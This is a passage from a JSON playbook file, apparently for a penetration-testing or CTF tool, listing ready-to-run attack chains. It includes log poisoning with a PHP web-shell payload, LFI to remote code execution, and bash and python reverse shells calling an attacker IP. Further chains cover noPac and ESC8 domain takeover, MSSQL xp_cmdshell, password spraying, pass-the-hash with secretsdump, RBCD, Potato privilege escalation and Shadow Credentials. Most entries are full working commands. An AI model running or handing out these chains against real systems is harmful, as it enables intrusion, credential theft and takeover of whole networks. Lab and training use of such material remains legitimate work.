          "name": "Poison Apache access.log (User-Agent injection)",
          "inline_command": "curl -A '<?php system($_GET[\"c\"]); ?>' '<base_url>'",
          "inputs": {
            "base_url": "${target_url}"
          },
          "notes": "Sets User-Agent to PHP code; Apache writes it verbatim into the log.\nDefault log paths: /var/log/apache2/access.log, /var/log/httpd/access_log,\n/var/log/nginx/access.log.\n"
        },
        {
          "id": "trigger_inclusion",
          "name": "Include the poisoned log to execute",
          "inline_command": "curl '<url>../../../../var/log/apache2/access.log&c=id'",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Output: `uid=33(www-data)...` interspersed with log lines. If you see\nit — RCE confirmed. Now drop a reverse shell:\n  c=bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'  (URL-encode!)\n"
        },
        {
          "id": "stable_shell",
          "name": "Upgrade to a reverse shell",
          "inline_command": "curl '<url>../../../../var/log/apache2/access.log&c=$(python3 -c \"import socket,os,pty; s=socket.socket(); s.connect((\\\"<lhost>\\\",<lport>)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\\\"/bin/bash\\\")\")'",
          "inputs": {
            "url": "${target_url}",
            "lhost": "${attacker_ip}",
            "lport": "4444"
          },
          "notes": "Catch with `nc -lvnp <lport>` then stabilize (CTRL+Z, stty raw -echo;\nfg, export TERM=xterm).\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — LFI / RFI",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html"
        },
        {
          "title": "PHP wrappers",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html"
        }
      ]
    },
    {
      "id": "linux-priv-esc-recon",
      "name": "Linux PE — recon (linpeas/lse/pspy)",
      "description": "Once you land a non-root shell on a Linux box, run the standard three enumeration sweeps and read their output with intent — not just glance. Captures the four most common privesc primitives (SUID, sudo, capabilities, writable cron) and pushes them to the board.\n",
      "tags": [
        "linux",
        "priv-esc",
        "recon",
        "post-exploitation"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip"
        }
      ],
      "steps": [
        {
          "id": "hostinfo",
          "name": "Quick host info (kernel, distro, who you are)",
          "inline_command": "id; uname -a; cat /etc/os-release; whoami; groups",
          "notes": "Old kernel + glibc → check DirtyCow / DirtyPipe / OverlayFS.\nMembership in `docker`, `lxd`, `disk`, `adm` is free privesc.\n"
        },
        {
          "id": "sudo_rights",
          "name": "What you can sudo (no password / specific binaries)",
          "inline_command": "sudo -n -l 2>/dev/null; sudo -l",
          "notes": "Anything in the list → check sudo-gtfobins-escalation chain.\n",
          "capture": [
            {
              "var": "sudo_allowed",
              "regex": "\\(([A-Za-z0-9_:,!]+)\\)\\s+(?:NOPASSWD:\\s+)?(.+)$",
              "match": "all",
              "groups": {
                "as": 1,
                "command": 2
              }
            }
          ]
        },
        {
          "id": "suid",
          "name": "SUID binaries (uid=0 by setuid)",
          "inline_command": "find / -perm -4000 -type f 2>/dev/null",
          "capture": [
            {
              "var": "suid_binaries",
              "regex": "^(/[^\\s]+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "capabilities",
          "name": "File capabilities",
          "inline_command": "getcap -r / 2>/dev/null",
          "notes": "cap_setuid+ep / cap_dac_read_search+ep / cap_chown+ep → priv esc.\nCross-reference with GTFOBins capabilities section.\n"
        },
        {
          "id": "linpeas",
          "name": "linpeas (full sweep) — review findings tagged in red/yellow",
          "inline_command": "curl -fsSL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh",
          "notes": "Heavy but worth it. Pay attention to: writable /etc/passwd-/shadow,\nwritable PATH dirs, cron jobs hitting writable scripts, unusual\nprocesses (pspy candidate), kernel CVEs section.\n"
        },
        {
          "id": "pspy",
          "name": "pspy — watch background processes (catch cron)",
          "inline_command": "curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -p -f",
          "notes": "Run for a few minutes. Any cron job that wraps a writable script in\na writable directory = privesc.\n"
        }
      ],
      "references": [
        {
          "title": "GTFOBins",
          "url": "https://gtfobins.github.io/"
        },
        {
          "title": "HackTricks — Linux PE",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
        }
      ]
    },
    {
      "id": "mssql-impersonation-chain",
      "name": "Lateral — MSSQL login → impersonate → xp_cmdshell → shell",
      "description": "MSSQL is the most under-defended foothold on AD networks. With any login, enumerate impersonation rights and linked servers, walk the trust graph, enable xp_cmdshell and pop a SYSTEM/svc shell.\n",
      "tags": [
        "mssql",
        "lateral-movement",
        "impersonation",
        "xp_cmdshell"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "probe",
          "name": "Confirm auth + privilege check",
          "command_ref": "nxc-mssql-priv",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "`IsSysadmin`, `IsDBOwner`, `HasPrivilege` lines are gold.\n"
        },
        {
          "id": "impersonate",
          "name": "Find IMPERSONATE rights (EXECUTE AS)",
          "command_ref": "nxc-mssql-enum-impersonate",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "If a low-priv login can EXECUTE AS sa, that's sysadmin via one line:\n`EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');`\n"
        },
        {
          "id": "linked_servers",
          "name": "Linked-server graph",
          "command_ref": "nxc-mssql-enum-links",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Walk linked servers with `EXEC ('xp_cmdshell ...') AT [LINKED]`. Often\nthe linked server is sysadmin even when the source isn't.\n"
        },
        {
          "id": "enable_xpcmdshell",
          "name": "Enable xp_cmdshell (requires sysadmin)",
          "command_ref": "nxc-mssql-enable-cmdshell",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "sp_configure 'show advanced options', 1; reconfigure;\nsp_configure 'xp_cmdshell', 1; reconfigure;\nRemember to turn it back off after — defenders watch for it.\n"
        },
        {
          "id": "shell_via_xpcmdshell",
          "name": "Trigger a reverse shell via xp_cmdshell",
          "command_ref": "nxc-mssql-xpcmdshell",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Pair with a Mission Control payload from commands/payloads/\n(`rsg-reverseshell-powershell-payload` or a PowerShell base64\none-liner). The MSSQL service usually runs as a domain svc account\n— that account often has SeImpersonatePrivilege → Potato → SYSTEM.\n"
        }
      ],
      "references": [
        {
          "title": "The Hacker Recipes — MSSQL",
          "url": "https://www.thehacker.recipes/ad/movement/mssql"
        },
        {
          "title": "NetExec — MSSQL",
          "url": "https://www.netexec.wiki/mssql-protocol"
        }
      ]
    },
    {
      "id": "nmap-recon",
      "name": "Recon — full nmap & service fingerprint",
      "description": "First-touch recon for any HTB/OSCP box. Quick discovery scan to learn open ports, then a versioned/scripted scan only on those ports for speed and noise control. Output flows directly into the Target Board (target_ip, open_ports, services) so every downstream chain becomes context-aware.\n",
      "tags": [
        "recon",
        "nmap",
        "enumeration"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "description": "IP of the box.",
          "source": "target_context.ip",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "tcp_discovery",
          "name": "Fast all-ports TCP discovery",
          "inline_command": "nmap -p- --min-rate=2000 -T4 -oN tcp-ports.nmap <ip>",
          "notes": "`-p-` covers the full 1-65535 range. Tune `--min-rate` down on flaky\nnetworks or up on CTFs. The output drives the auto-extract parser\nwhich populates target_ip + open_ports on the board.\n",
          "inputs": {
            "ip": "${target_ip}"
          },
          "capture": [
            {
              "var": "open_ports",
              "regex": "^(\\d{1,5})/(?:tcp|udp)\\s+open",
              "match": "all"
            }
          ]
        },
        {
          "id": "versioned_scan",
          "name": "Versioned scan + default scripts on open ports",
          "inline_command": "nmap -sC -sV -p <ports> -oN versioned.nmap <ip>",
          "requires": [
            "open_ports"
          ],
          "inputs": {
            "ip": "${target_ip}",
            "ports": "${open_ports}"
          },
          "notes": "Now that we know what's open, get banners and run NSE default\nscripts. Look for: SMB signing, LDAP base DNs, Kerberos realm hints,\nRPC interfaces, web tech stacks, DB versions.\n"
        },
        {
          "id": "udp_top_100",
          "name": "UDP top-100 (slow but worth it)",
          "inline_command": "sudo nmap -sU --top-ports 100 -oN udp-top100.nmap <ip>",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Skip on time-pressed CTFs unless DNS/SNMP/IKE/etc. show up later.\nDNS (53), SNMP (161), and IKE (500) regularly hide initial access.\n"
        }
      ],
      "references": [
        {
          "title": "Nmap NSE script docs",
          "url": "https://nmap.org/nsedoc/"
        },
        {
          "title": "HackTricks — Pentesting Methodology",
          "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html"
        }
      ]
    },
    {
      "id": "nopac-cve-2021-42278",
      "name": "AD — noPac / sAMAccountName spoof (CVE-2021-42278/42287)",
      "description": "Pre-November-2021 Active Directory let any user with MachineAccountQuota>0 create a computer object, then rename it to a DC's sAMAccountName without the trailing $. The KDC issues TGS-as-Administrator to that \"new DC\" = instant domain takeover.\n",
      "tags": [
        "nopac",
        "sam-the-admin",
        "cve-2021-42278",
        "cve-2021-42287",
        "priv-esc"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "vuln_check",
          "name": "Confirm vulnerability",
          "command_ref": "nxc-smb-nopac",
          "inputs": {
            "ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          }
        },
        {
          "id": "detonate",
          "name": "Run the noPac exploit (impacket-fork)",
          "inline_command": "git clone https://github.com/Ridter/noPac /tmp/nopac; python3 /tmp/nopac/noPac.py '<domain>'/'<user>':'<password>' -dc-ip <dc-ip> -shell --impersonate administrator",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "The exploit adds a temporary computer, swaps its sAMAccountName,\nrequests a TGS as Administrator and drops you into a psexec shell\nas NT AUTHORITY\\\\SYSTEM. Some implementations also offer\n`--dump-creds` to skip straight to DCSync output.\n"
        },
        {
          "id": "dcsync_directly",
          "name": "Or skip the shell: dump straight from the TGT",
          "inline_command": "python3 /tmp/nopac/noPac.py '<domain>'/'<user>':'<password>' -dc-ip <dc-ip> --impersonate administrator --dump",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "^Administrator:500:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            },
            {
              "var": "krbtgt_nt_hash",
              "regex": "^krbtgt:502:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "noPac (Ridter)",
          "url": "https://github.com/Ridter/noPac"
        },
        {
          "title": "Charlie Clark's noPac writeup",
          "url": "https://exploit.ph/exploiting-cve-2021-42278-and-cve-2021-42287.html"
        }
      ]
    },
    {
      "id": "ntlm-relay-adcs",
      "name": "Coerce → NTLM Relay → ADCS (ESC8) → DC Hash",
      "description": "Classic ESC8 chain. Start a relay listener pointed at the ADCS web enrollment endpoint, coerce the DC into authenticating to you, capture a certificate as the DC, then use that certificate to PKINIT-auth and recover the DC's NT hash.\n",
      "tags": [
        "adcs",
        "esc8",
        "ntlm-relay",
        "coercion",
        "certificates",
        "active-directory"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "description": "Target DC IP (the one we coerce).",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "adcs_ip",
          "description": "IP of the ADCS server hosting /certsrv/.",
          "required": true
        },
        {
          "name": "listener_ip",
          "description": "Your attacker IP — where ntlmrelayx is listening.",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain"
        }
      ],
      "steps": [
        {
          "id": "relay_listener",
          "name": "Start the relay to ADCS web enrollment",
          "notes": "Run this FIRST and leave it running. The DomainController template is\na safe default; some environments use Machine or DomainControllerAuthentication.\n",
          "command_ref": "ntlmrelayx-adcs",
          "inputs": {
            "ip": "${adcs_ip}",
            "template": "DomainController"
          },
          "capture": [
            {
              "var": "dc_pfx",
              "regex": "Base64 certificate of user[^:]*:\\s*([A-Za-z0-9+/=]+)",
              "match": "first"
            },
            {
              "var": "dc_pfx_file",
              "regex": "Saving PFX to ([^\\s]+\\.pfx)",
              "match": "first"
            }
          ]
        },
        {
          "id": "coerce_auth",
          "name": "Coerce the DC into authenticating to your listener",
          "notes": "PetitPotam, DFSCoerce, PrinterBug — Coercer tries them all. The DC\nwill then hit /certsrv/, get relayed by ntlmrelayx, and a cert pops\nout in the listener window above.\n",
          "command_ref": "coercer",
          "inputs": {
            "listener_ip": "${listener_ip}",
            "target_ip": "${dc_ip}"
          }
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate with the DC certificate",
          "notes": "certipy auth performs PKINIT, returns both a TGT and the DC's NT hash.\nOnce you have the NT hash you own the domain.\n",
          "command_ref": "certipy-auth",
          "requires": [
            "dc_pfx_file"
          ],
          "inputs": {
            "pfx_file": "${dc_pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dump_with_dc_hash",
          "name": "DCSync with the DC machine account",
          "command_ref": "secretsdump",
          "requires": [
            "dc_nt_hash"
          ],
          "notes": "Use the DC machine-account hash (computername$) with secretsdump in\nits NTLM-hash variation to DCSync every credential in the domain.\n"
        }
      ],
      "references": [
        {
          "title": "ESC8 — SpecterOps ADCS Attacks",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        },
        {
          "title": "Coercer",
          "url": "https://github.com/p0dalirius/Coercer"
        },
        {
          "title": "Certipy",
          "url": "https://github.com/ly4k/Certipy"
        }
      ]
    },
    {
      "id": "password-spray",
      "name": "Cred Access — password spraying (low & slow)",
      "description": "Spray a small candidate list against the user pool harvested in recon. Read the password policy first to size the batch and stay under the lockout threshold — getting an account locked out on an OSCP machine burns the box.\n",
      "tags": [
        "credential-access",
        "password-spray",
        "smb",
        "ldap"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain"
        }
      ],
      "steps": [
        {
          "id": "policy_check",
          "name": "Password policy (lockout threshold!)",
          "inline_command": "nxc smb <ip> -u '' -p '' --pass-pol",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "Lockout count tells you how many bad attempts per account before lockout.\nSpray 1 password per round; sleep 30+ minutes between rounds if\nlockoutWindow > 0.\n"
        },
        {
          "id": "build_candidates",
          "name": "Build candidate passwords",
          "inline_command": "printf '%s\\n' Welcome1 Password1 Summer2024! Spring2025! '<Company>2024!' Passw0rd! P@ssw0rd > spray.txt",
          "notes": "Replace `<Company>` with actual org name from web/SMB recon. Most\ndomain users pick season+year or company+year. Avoid >5 unless\nlockout is disabled.\n"
        },
        {
          "id": "spray_smb",
          "name": "Spray candidates via SMB",
          "command_ref": "nxc-smb-spray",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "`[+] DOMAIN\\\\user:password` lines = hits. Auto-extract picks them up\nas cracked_creds for downstream chains.\n",
          "capture": [
            {
              "var": "spray_hits",
              "regex": "\\[\\+\\]\\s+\\S+\\\\([A-Za-z0-9._-]+):(\\S+)",
              "match": "all",
              "groups": {
                "user": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "validate_hit",
          "name": "Validate winning credential",
          "command_ref": "nxc-smb-auth",
          "requires": [
            "spray_hits"
          ],
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "Re-run with the single hit to confirm + check (Pwn3d!) marker for\nlocal-admin rights. If Pwn3d! → straight to evil-winrm / atexec.\n"
        }
      ],
      "references": [
        {
          "title": "The Hacker Recipes — Password Spray",
          "url": "https://www.thehacker.recipes/ad/movement/credentials/dumping/spray"
        },
        {
          "title": "NetExec — bruteforce",
          "url": "https://www.netexec.wiki/getting-started/bruteforce"
        }
      ]
    },
    {
      "id": "pth-lateral-spread",
      "name": "Lateral — Pass-the-Hash spread + Pwn3d! discovery",
      "description": "With a captured NTLM hash, sweep every reachable Windows host to find where the principal has local-admin (the famous `(Pwn3d!)` marker), then open a shell on the first hit. Bread-and-butter lateral movement.\n",
      "tags": [
        "pass-the-hash",
        "lateral-movement",
        "pwn3d",
        "smb",
        "winrm"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_subnet",
          "description": "CIDR or single IP — usually the AD subnet.",
          "required": true
        },
        {
          "name": "user",
          "description": "The principal that owns the NT hash.",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "hash",
          "description": "Captured NTLM hash (32 hex chars or LM:NT).",
          "source": "target_context.hash",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain"
        }
      ],
      "steps": [
        {
          "id": "spray_hash_smb",
          "name": "Sweep SMB with the hash, look for Pwn3d!",
          "inline_command": "nxc smb <subnet> -u '<user>' -H '<hash>' -d '<domain>' --continue-on-success",
          "inputs": {
            "subnet": "${target_subnet}",
            "user": "${user}",
            "hash": "${hash}",
            "domain": "${domain}"
          },
          "capture": [
            {
              "var": "pwn3d_hosts",
              "regex": "^SMB\\s+(\\S+)\\s+\\d+\\s+\\S+\\s+\\[\\+\\][^\\n]*\\(Pwn3d!\\)",
              "match": "all"
            }
          ]
        },
        {
          "id": "sweep_winrm",
          "name": "Also try WinRM (some hosts only expose 5985)",
          "inline_command": "nxc winrm <subnet> -u '<user>' -H '<hash>' -d '<domain>'",
          "inputs": {
            "subnet": "${target_subnet}",
            "user": "${user}",
            "hash": "${hash}",
            "domain": "${domain}"
          }
        },
        {
          "id": "dump_hashes_on_pwn3d",
          "name": "secretsdump on a Pwn3d! host → snowball more creds",
          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<user>'@<pwn3d_host>",
          "requires": [
            "pwn3d_hosts"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "hash": "${hash}"
          },
          "notes": "One Pwn3d! → SAM/LSA dump → new NT hashes → re-run this chain with\neach new identity. Common Active Directory pivot pattern.\n",
          "capture": [
            {
              "var": "ntlm_hashes",
              "regex": "^([A-Za-z0-9._$-]+):(\\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
              "match": "all",
              "groups": {
                "user": 1,
                "rid": 2,
                "lm": 3,
                "nt": 4
              }
            }
          ]
        },
        {
          "id": "shell",
          "name": "Open an interactive shell on the Pwn3d! host",
          "inline_command": "evil-winrm -i <pwn3d_host> -u '<user>' -H '<hash>'",
          "requires": [
            "pwn3d_hosts"
          ],
          "inputs": {
            "user": "${user}",
            "hash": "${hash}"
          },
          "notes": "Prefer WinRM (5985) for an interactive PowerShell. Fall back to\n`impacket-psexec` / `wmiexec` / `atexec` with the same hash if WinRM\nisn't open.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Pass-the-Hash",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html"
        },
        {
          "title": "NetExec — SMB",
          "url": "https://www.netexec.wiki/smb-protocol"
        }
      ]
    },
    {
      "id": "rbcd-takeover",
      "name": "AD — RBCD (Resource-Based Constrained Delegation) takeover",
      "description": "When you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer (or you own a computer account thanks to MachineAccountQuota>0), you can have your controlled machine S4U2self/S4U2proxy onto the target as anyone — including SYSTEM via the CIFS service.\n",
      "tags": [
        "rbcd",
        "delegation",
        "priv-esc",
        "kerberos",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "target_computer",
          "description": "Computer object you want to take over (e.g. SRV01$).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "maq_check",
          "name": "Check MachineAccountQuota (default = 10)",
          "command_ref": "nxc-ldap-maq",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "If MAQ > 0 any domain user can add their own computer object. That\nattacker-owned machine becomes the principal you delegate FROM.\n"
        },
        {
          "id": "add_attacker_computer",
          "name": "Create attacker-controlled computer account",
          "command_ref": "nxc-ldap-add-computer",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "The new computer account gets a random password; the tool prints it.\nNote the FQDN/SamAccountName for the next step.\n",
          "capture": [
            {
              "var": "attacker_computer",
              "regex": "Successfully added machine account ([A-Za-z0-9$]+) with password ([^\\s]+)",
              "match": "first",
              "groups": {
                "sam": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "write_rbcd",
          "name": "Write attacker-computer into target's msDS-AllowedToActOnBehalfOfOtherIdentity",
          "command_ref": "bloodyad-rbcd",
          "requires": [
            "attacker_computer"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          }
        },
        {
          "id": "s4u2self",
          "name": "S4U2self+S4U2proxy to forge an admin ticket",
          "inline_command": "impacket-getST -spn 'cifs/<target>' -impersonate Administrator -dc-ip <dc-ip> '<domain>/<attacker_sam>:<attacker_password>'",
          "requires": [
            "attacker_computer"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "target": "${target_computer}"
          },
          "notes": "The ticket lives at `Administrator@cifs_<target>.ccache`. Export\nKRB5CCNAME and you can secretsdump / psexec / smbexec as Administrator.\n"
        },
        {
          "id": "dump_secrets",
          "name": "secretsdump the target with the forged ticket",
          "inline_command": "export KRB5CCNAME=Administrator@cifs_<target>.ccache; impacket-secretsdump -k -no-pass <target>",
          "inputs": {
            "target": "${target_computer}"
          }
        }
      ],
      "references": [
        {
          "title": "RBCD — Elad Shamir",
          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
        },
        {
          "title": "HackTricks — RBCD",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html"
        }
      ]
    },
    {
      "id": "seimpersonate-potato",
      "name": "Windows PE — SeImpersonatePrivilege → SYSTEM (Potato family)",
      "description": "Service accounts (IIS, SQL, etc.) almost always carry SeImpersonatePrivilege. That single right plus the right helper binary == NT AUTHORITY\\\\SYSTEM. Different Windows versions need different \"potatoes\" — pick the right one.\n",
      "tags": [
        "windows",
        "priv-esc",
        "potato",
        "token-impersonation"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "confirm_priv",
          "name": "Confirm SeImpersonatePrivilege is enabled",
          "inline_command": "whoami /priv | findstr SeImpersonate",
          "notes": "Must show `Enabled`. If only `Disabled` — most service accounts can\nstill enable it via a tiny AdjustTokenPrivileges call (PowerSploit).\n"
        },
        {
          "id": "pick_potato",
          "name": "Pick the potato for the Windows version",
          "inline_command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n",
          "notes": "Server 2008 R2 / Win 7 / Server 2012:  JuicyPotato (BITS COM CLSID)\nServer 2016 / Win 10 1809+:           RoguePotato / PrintSpoofer\nServer 2019 / Server 2022 / Win 11:   GodPotato (RPC over SMB)\nThe patched-DCOM list breaks JuicyPotato on newer versions — start\nwith PrintSpoofer/GodPotato when in doubt.\n"
        },
        {
          "id": "printspoofer",
          "name": "PrintSpoofer (most modern Windows)",
          "inline_command": "PrintSpoofer.exe -i -c cmd",
          "notes": "Needs SeImpersonatePrivilege + RPC printer spooler reachable. Drops\nyou into a SYSTEM shell. Use `-c \\\"<command>\\\"` to fire-and-forget.\n"
        },
        {
          "id": "godpotato",
          "name": "GodPotato (Windows 2022 / 11)",
          "inline_command": "GodPotato.exe -cmd \"cmd /c whoami > C:\\Users\\Public\\who.txt\"",
          "notes": "GodPotato survives the patches that killed JuicyPotato. Same idea —\nimpersonate the SYSTEM token via the RpcCss service.\n"
        },
        {
          "id": "juicypotato_legacy",
          "name": "JuicyPotato (legacy Windows ≤ 2016)",
          "inline_command": "JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -l 9999 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\"",
          "notes": "The CLSID list at https://github.com/ohpe/juicy-potato/tree/master/CLSID\ngroups working CLSIDs per OS build. Use a CLSID flagged for SYSTEM.\n"
        },
        {
          "id": "confirm_system",
          "name": "Confirm SYSTEM",
          "inline_command": "whoami",
          "notes": "Expected: `nt authority\\\\system`. From here: secretsdump locally,\nmimikatz, drop a persistence service / scheduled task.\n"
        }
      ],
      "references": [
        {
          "title": "Potato family — itm4n",
          "url": "https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/"
        },
        {
          "title": "GodPotato",
          "url": "https://github.com/BeichenDream/GodPotato"
        }
      ]
    },
    {
      "id": "shadow-credentials",
      "name": "AD — Shadow Credentials (msDS-KeyCredentialLink)",
      "description": "When you have write access to a target principal (GenericWrite/AllExtendedRights on a user or computer), Shadow Credentials lets you add a key credential and PKINIT as that principal. Cleaner than a password reset — leaves the existing password intact and avoids audit noise.\n",
      "tags": [
        "shadow-credentials",
        "key-credential",
        "dacl-abuse",
        "priv-esc",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "description": "Principal you control (has write rights on target).",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "target_principal",
          "description": "User/computer whose key credentials you write.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "bloodhound_path",
          "name": "Confirm the write-access path via BloodHound",
          "inline_command": "echo 'In BloodHound, query: MATCH (n {name:\"<USER>\"}), (m {name:\"<TARGET>\"}), p=shortestPath((n)-[*]->(m)) RETURN p'",
          "notes": "Look for GenericWrite, GenericAll, WriteOwner, AllExtendedRights, or\nAddKeyCredentialLink directly. Anything that lets you write\nmsDS-KeyCredentialLink works.\n"
        },
        {
          "id": "write_keycred",
          "name": "Add a KeyCredentialLink to the target",
          "command_ref": "certipy-shadow",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "target_user": "${target_principal}"
          },
          "notes": "certipy writes the cert into msDS-KeyCredentialLink, prints a PFX\nand a one-shot ccache. Stash the PFX path for the next step.\n",
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            },
            {
              "var": "target_nt_hash",
              "regex": "Got hash for '\\S+':[^a-f0-9]*([a-f0-9]{32}):([a-f0-9]{32})",
              "match": "first",
              "groups": {
                "lm": 1,
                "nt": 2
              }
            }
          ]
        },
        {
          "id": "confirm_hash",
          "name": "Confirm the recovered NT hash",
          "inline_command": "echo 'Captured NT hash for <target>. Use it directly with secretsdump / evil-winrm / nxc --H.'",
          "requires": [
            "target_nt_hash"
          ]
        },
        {
          "id": "cleanup",
          "name": "Clean up the planted key (recommended)",
          "inline_command": "certipy shadow clear -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "target": "${target_principal}"
          },
          "notes": "Removes the KeyCredential entry you wrote. Polite for blue-team labs\nand stops anyone else from reusing your foothold.\n"
        }
      ],
      "references": [
        {
          "title": "Shadow Credentials — SpecterOps",
          "url": "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec"
        },
        {
          "title": "Certipy shadow command",
          "url": "https://github.com/ly4k/Certipy#shadow"
        }
      ]
    },
    {
      "id": "shell-stabilization",
      "name": "Post-Ex — stabilize a noisy reverse shell",
      "description": "You popped a netcat reverse shell. CTRL+C kills it; tab-completion is dead; vim is mangled. Apply the canonical 4-step upgrade to get a real TTY. Memorize it — you'll do this 200 times.\n",
      "tags": [
        "post-exploitation",
        "shell-upgrade",
        "tty",
        "linux"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "lport",
          "description": "Port your nc listener is on.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "spawn_pty",
          "name": "Step 1 — Upgrade to a PTY (python/script/expect)",
          "inline_command": "# In the shell (try in order):\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# or:\npython  -c 'import pty; pty.spawn(\"/bin/bash\")'\n# or:\nscript -qc /bin/bash /dev/null\n# or BSD-style:\n/usr/bin/script -qc /bin/bash /dev/null\n"
        },
        {
          "id": "set_term",
